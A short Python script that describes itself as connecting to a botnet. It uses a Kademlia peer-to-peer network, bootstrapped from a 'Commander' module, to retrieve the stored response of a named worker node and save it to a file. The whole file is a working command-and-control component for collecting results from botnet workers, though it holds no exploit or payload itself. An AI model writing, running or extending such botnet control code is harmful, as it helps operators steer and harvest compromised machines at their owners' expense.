import argparse
import asyncio

from kademlia.network import Server
from Commander import BOOTSTRAP, get_logger

kad_log = get_logger('kademlia')
log = get_logger(__name__)

#
#   connects to botnet, gets response, writes response to a file named <worker_key>
#
async def run(worker_key):
    server = Server()
    await server.listen(8469)
    await server.bootstrap(BOOTSTRAP)

    log.info(f'Getting response from worker with key: {worker_key}...')
    result = await server.get(worker_key)

    if result != None:
        log.info('A response has been found')
        with open(worker_key, "w") as f: #TODO: put response in separate folder
            f.write(result)
    else:
        log.info('Could not find a response')
    
    server.stop()

def parse_arguments():
    parser = argparse.ArgumentParser(description="Get a worker response", usage="%(prog)s <worker key>",)
    parser.add_argument('worker_key', type=str, help='The worker key')
    return parser.parse_args()

args = parse_arguments()
asyncio.run(run(args.worker_key))